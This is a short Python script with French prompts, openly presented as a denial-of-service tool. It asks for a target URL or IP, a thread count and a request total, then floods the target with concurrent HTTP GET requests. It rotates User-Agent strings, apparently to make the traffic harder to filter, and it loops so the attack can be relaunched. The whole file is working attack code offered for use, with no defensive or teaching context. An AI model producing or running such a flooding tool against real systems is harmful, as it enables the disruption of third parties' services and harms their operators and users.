import concurrent.futures
import requests
import random

def send_request(url):
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (X11; Linux x86_64)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
        ])
    }
    try:
        requests.get(url, headers=headers, timeout=3)
        print("[+] Requête envoyée")
    except requests.RequestException:
        print("[!] Erreur lors de la requête")

def run_dos():
    url = input("Entrez l'IP ou URL cible (ex: http://1.2.3.4) : ").strip()
    try:
        threads = int(input("Nombre de threads (ex: 100) : "))
        total_requests = int(input("Nombre total de requêtes (ex: 1000) : "))
    except ValueError:
        print("Valeurs invalides.")
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(send_request, url) for _ in range(total_requests)]
        concurrent.futures.wait(futures)

    print("DOS terminé.")

def main():
    while True:
        run_dos()
        choice = input("Veux-tu relancer le DOS ? (o/n) : ").strip().lower()
        if choice != 'o':
            print("Fin du programme.")
            break

if __name__ == "__main__":
    main()
